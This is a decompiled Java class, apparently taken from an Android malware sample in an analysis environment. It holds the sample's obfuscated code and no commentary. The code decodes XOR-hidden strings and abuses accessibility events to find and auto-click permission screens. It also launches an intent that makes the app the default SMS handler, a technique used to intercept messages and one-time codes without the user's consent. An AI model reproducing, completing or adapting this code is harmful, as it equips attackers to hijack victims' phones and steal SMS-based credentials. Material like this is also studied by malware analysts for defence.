package com.zjxyxnvvp.nxvxchltf.util;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.provider.Telephony;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.opnoPAWNDioaNDW;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class j {
    private static short[] $ = {1203, 1202, 1215, 1214, 1156, 1192, 1206, 1192, 4905, 4901, 4903, 4964, 4909, 4901, 4901, 4909, 4902, 4911, 4964, 4907, 4900, 4910, 4920, 4901, 4899, 4910, 4964, 4922, 4911, 4920, 4903, 4899, 4921, 4921, 4899, 4901, 4900, 4905, 4901, 4900, 4926, 4920, 4901, 4902, 4902, 4911, 4920, 7450, 7445, 7455, 7433, 7444, 7442, 7455, 7509, 7435, 7433, 7444, 7437, 7442, 7455, 7454, 7433, 7509, 7471, 7454, 7447, 7454, 7435, 7443, 7444, 7445, 7426, 7509, 7482, 7480, 7471, 7474, 7476, 7477, 7460, 7480, 7475, 7482, 7477, 7484, 7486, 7460, 7487, 7486, 7485, 7482, 7470, 7479, 7471, 3272, 3289, 3291, 3283, 3289, 3295, 3293};

    /* renamed from: a  reason: collision with root package name */
    private static long f370a;

    /* renamed from: b  reason: collision with root package name */
    private static long f371b;
    private static long c;
    private static String d;

    /* JADX INFO: Access modifiers changed from: package-private */
    /* loaded from: /home/remnux/decompressedMalicious.dex */
    public class a implements Runnable {
        a() {
        }

        @Override // java.lang.Runnable
        public void run() {
            c.b();
        }
    }

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    private static String a(UIDNwaidobaWIODb uIDNwaidobaWIODb) {
        if (d != null && System.currentTimeMillis() - c < 5000) {
            return d;
        }
        c = System.currentTimeMillis();
        String defaultSmsPackage = Telephony.Sms.getDefaultSmsPackage(uIDNwaidobaWIODb);
        d = defaultSmsPackage;
        return defaultSmsPackage;
    }

    public static void b(UIDNwaidobaWIODb uIDNwaidobaWIODb, AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
        CharSequence packageName = accessibilityEvent.getPackageName();
        if (accessibilityNodeInfo != null && packageName != null && !UIDNwaidobaWIODb.k && UIDNwaidobaWIODb.l) {
            long currentTimeMillis = System.currentTimeMillis();
            if (currentTimeMillis - UIDNwaidobaWIODb.f >= 5000) {
                d dVar = d.e;
                String a2 = a(uIDNwaidobaWIODb);
                if (a2 == null) {
                    a2 = "";
                }
                String packageName2 = uIDNwaidobaWIODb.getPackageName();
                if (dVar.f314a.g(uIDNwaidobaWIODb, $(0, 8, 1243)) && !a2.equals(packageName2)) {
                    if (packageName.equals($(8, 47, 4938)) && currentTimeMillis - f371b > 500) {
                        for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByText(b.l(uIDNwaidobaWIODb))) {
                            uIDNwaidobaWIODb.d(accessibilityNodeInfo2, new a());
                            f371b = currentTimeMillis;
                        }
                    } else if (currentTimeMillis - f370a > 15000) {
                        if (Build.VERSION.SDK_INT >= 29) {
                            uIDNwaidobaWIODb.startActivity(new Intent(uIDNwaidobaWIODb, opnoPAWNDioaNDW.class).addFlags(268435456));
                            a.d = System.currentTimeMillis() + 12000;
                        } else {
                            c(uIDNwaidobaWIODb, packageName2);
                            c.b();
                        }
                        f370a = currentTimeMillis;
                    }
                }
            }
        }
    }

    public static void c(Context context, String str) {
        try {
            Intent intent = new Intent($(47, 95, 7547));
            intent.putExtra($(95, 102, 3256), str);
            intent.addFlags(268435456);
            context.startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
